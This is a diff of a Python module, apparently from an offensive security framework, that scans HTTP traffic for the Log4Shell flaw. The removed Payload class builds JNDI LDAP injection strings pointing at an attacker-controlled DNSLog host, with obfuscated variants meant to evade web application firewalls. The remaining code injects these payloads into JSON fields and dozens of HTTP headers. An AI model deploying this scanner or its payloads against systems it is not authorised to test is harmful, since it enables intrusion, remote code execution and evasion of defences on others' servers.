@@ -3,12 +3,11 @@
 # @Date  : 2019/3/15
 # @Desc  :
 
-import ipaddress
 import json
-import uuid
 
 from Lib.ModuleAPI import *
-from Lib.api import random_str, random_int, is_json
+from Lib.api import is_json, get_one_uuid_str
+from Lib.payloads import Log4jPayload
 from PostModule.Handle.proxyhttpscan import ProxyResponse, ProxyRequest
 
 """
@@ -19,6 +18,7 @@ from PostModule.Handle.proxyhttpscan import ProxyResponse, ProxyRequest
 # VMWare VCenter
 /websso/SAML2/SSO/vsphere.local?SAMLRequest=
 """
+
 
 class JsonReplace(object):
     def __init__(self):
@@ -69,41 +69,6 @@ class JsonReplace(object):
             elif isinstance(val_, bytes):
                 val[index] = changeData.encode()
         return val
-
-
-class Payload(object):
-    def __init__(self):
-        pass
-
-    def is_ip_port(self, dnslog_base):
-        try:
-            ip_port = dnslog_base.split(":")
-            port = int(ip_port[1])
-            if port < 0 or port > 65535:
-                return False
-            ip = ipaddress.IPv4Address(ip_port[0])
-            return True
-        except Exception as E:
-            return False
-
-    def bypass_waf_payload(self, raw_payload):
-        new_payload = ""
-        for one_raw in raw_payload:
-            one_format = ""
-            for i in range(random_int(3)):
-                one_format = f"{one_format}{random_str(random_int(3))}:"
-            one_new = f"${{{one_format}-{one_raw}}}"
-            new_payload = f"{new_payload}{one_new}"
-        return new_payload
-
-    def get_payload_list(self, req_uuid, dnslog_base):
-        if self.is_ip_port(dnslog_base):
-            raw_payload = f"jndi:ldap://{dnslog_base}/{req_uuid}"
-            bypass_payload = self.bypass_waf_payload(raw_payload)
-        else:
-            raw_payload = f"jndi:ldap://{req_uuid}.{dnslog_base}/hi"
-            bypass_payload = self.bypass_waf_payload(raw_payload)
-        return [f"${{{raw_payload}}}", f"${{{bypass_payload}}}"]
 
 
 class PostModule(ProxyHttpScanModule):
@@ -157,12 +122,11 @@ class PostModule(ProxyHttpScanModule):
                         'X-If-Unmodified-Since', 'X-Imbo-Test-Config', 'X-Insight', 'X-Ip', 'X-Ip-Trail',
                         'X-ProxyUser-Ip', 'X-Requested-With', 'X-Request-ID', 'X-UIDH', 'X-Wap-Profile', 'X-XSRF-TOKEN']
         self.headers_index = 0
-        self.payload = Payload()
 
     def payload_list(self, req_uuid):
         if self.param("DNSLOG") is None:
             return []
-        payloads = Payload().get_payload_list(req_uuid, self.param("DNSLOG"))
+        payloads = Log4jPayload().get_payload_list(req_uuid, self.param("DNSLOG"))
         return payloads
 
     def get_header(self):
@@ -181,7 +145,7 @@ class PostModule(ProxyHttpScanModule):
         request.log = self.param("LogRequest")
         request.timeout = self.param("TIMEOUT")
 
-        req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+        req_uuid = get_one_uuid_str()
         payloads = self.payload_list(req_uuid)
         uuid_data = {
             "UUID": req_uuid,
@@ -229,7 +193,7 @@ class PostModule(ProxyHttpScanModule):
                         result = request.send()
 
         if self.param("ScanHeader"):
-            req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
+            req_uuid = get_one_uuid_str()
             payloads = self.payload_list(req_uuid)
             uuid_data = {
                 "UUID": req_uuid,
